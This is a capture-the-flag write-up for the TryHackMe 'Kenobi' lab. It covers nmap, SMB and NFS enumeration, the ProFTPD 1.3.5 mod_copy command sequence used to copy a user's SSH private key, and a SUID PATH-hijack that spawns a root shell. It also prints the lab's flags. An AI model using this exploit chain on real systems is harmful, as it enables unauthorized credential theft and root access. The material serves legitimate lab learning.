# Kenobi — TryHackMe

## Info

| Field      | Details          |
|------------|------------------|
| Platform   | TryHackMe        |
| Difficulty | Easy             |
| OS         | Linux (Ubuntu)   |
| Topics     | SMB, NFS, FTP, SUID, Privilege Escalation |

---

## Summary

Kenobi is a Linux machine that involves enumerating SMB and NFS shares to gather information, exploiting a known vulnerability in ProFTPD 1.3.5 (mod_copy) to steal an SSH private key, and escalating privileges via a misconfigured SUID binary that uses relative paths.

---

## Reconnaissance

### Full Port Scan

```
nmap -sS -p- -T4 <target-ip>
```

This reveals all open ports before running service detection, avoiding missed ports from a default scan.

**Open ports:** 21 (FTP), 22 (SSH), 80 (HTTP), 111 (rpcbind), 139/445 (SMB), 2049 (NFS)

### Service Detection

```
nmap -sV -sC -p 21,22,80,111,139,445,2049 <target-ip>
```

Key findings:
- **FTP**: ProFTPD 1.3.5 — a version with a known mod_copy vulnerability
- **HTTP**: Apache 2.4.41 — robots.txt reveals `/admin.html`
- **SMB**: Samba on ports 139 and 445
- **NFS**: Port 2049 with rpcbind on 111 — indicates a network file share

---

## Enumeration

### SMB

Attempted nmap SMB scripts first:

```
nmap -p 139,445 --script=smb-enum-shares.nse,smb-enum-users.nse <target-ip>
```

The scripts returned no useful output — the server does not allow anonymous enumeration via nmap scripts. Falling back to smbclient:

```
smbclient -L //<target-ip> -N
```

Three shares found: `print$`, `anonymous`, `IPC$`. The `anonymous` share stands out — no credentials required.

```
smbclient //<target-ip>/anonymous -N
```

Found a file: `log.txt`. Downloaded it with `get log.txt`.

**Key information from log.txt:**
- Username: `kenobi`
- SSH private key location: `/home/kenobi/.ssh/id_rsa`
- FTP running on port 21 with ProFTPD 1.3.5
- The anonymous SMB share points to `/home/kenobi/share`

### NFS

Two approaches used to enumerate NFS — both give the same result, but it's useful to know alternatives in case one is blocked by a firewall:

```
showmount -e <target-ip>
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <target-ip>
```

Result: `/var` is exported to `*` (anyone). Access is read-only.

Mounted the share locally:

```
sudo mkdir /mnt/kenobiNFS
sudo mount <target-ip>:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```

Checked `/var/backups` and `/var/log` — nothing directly useful, but the mount gives us read access to `/var/tmp` which becomes important in the next step.

---

## Exploitation — ProFTPD 1.3.5 mod_copy

ProFTPD 1.3.5 is vulnerable to an unauthenticated file copy via the `SITE CPFR` / `SITE CPTO` commands (mod_copy module). This allows copying any file on the server without authentication.

Connected to FTP via netcat:

```
nc <target-ip> 21
```

Server confirms: `220 ProFTPD 1.3.5 Server`

Used mod_copy to copy kenobi's SSH private key to `/var/tmp`, which we already have mounted via NFS:

```
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

Response:
```
350 File or directory exists, ready for destination name
250 Copy successful
```

Verified the file appeared in our NFS mount:

```
ls -la /mnt/kenobiNFS/tmp/
```

`id_rsa` is present, owned by our local user — the copy worked.

---

## Initial Access — SSH as kenobi

Copied the key locally and set correct permissions:

```
cp /mnt/kenobiNFS/tmp/id_rsa ~/
chmod 600 ~/id_rsa
ssh -i ~/id_rsa kenobi@<target-ip>
```

SSH accepted the key without a passphrase. We are in as `kenobi`.

### User Flag

```
cat /home/kenobi/user.txt
```

`d0b0f3f53b6caa532a83915e19224899`

---

## Privilege Escalation — SUID Binary PATH Manipulation

Searched for SUID binaries:

```
find / -perm -u=s -type f 2>/dev/null
```

A non-standard binary appeared: `/usr/bin/menu`. This is not a default Linux binary and runs with SUID (as root).

Running it shows a menu with three options: status check, kernel version, ifconfig.

The binary calls system commands (`curl`, `uname`, `ifconfig`) using **relative paths** — meaning it relies on `$PATH` to find them rather than using full paths like `/sbin/ifconfig`. This is exploitable.

**The attack:** Create a malicious `ifconfig` script that spawns a shell, place it in `/tmp`, and prepend `/tmp` to `$PATH`. When the menu calls `ifconfig`, it finds our fake version first and executes it as root.

```
cd /tmp
echo /bin/bash > ifconfig
chmod 777 ifconfig
export PATH=/tmp:$PATH
/usr/bin/menu
```

Selected option `3` (ifconfig) — a root shell spawned.

### Root Flag

```
cat /root/root.txt
```

`177b3cd8562289f37382721c28381f02`

---

## What Failed / Dead Ends

- `nmap --script smb-enum-shares/users` returned no output — the server blocks anonymous SMB enumeration via nmap scripts. Used `smbclient` instead.
- Checked `/var/backups` and `/var/log` via NFS — nothing directly exploitable there.
- `/admin.html` on port 80 was checked but led nowhere useful for this attack path.

---

## Key Takeaways

- Always check NFS exports — a world-readable mount can expose sensitive paths
- ProFTPD 1.3.5 mod_copy requires no authentication — a critical misconfiguration
- SUID binaries using relative paths are always worth investigating
- When one enumeration method fails, try an alternative (nmap scripts vs smbclient)
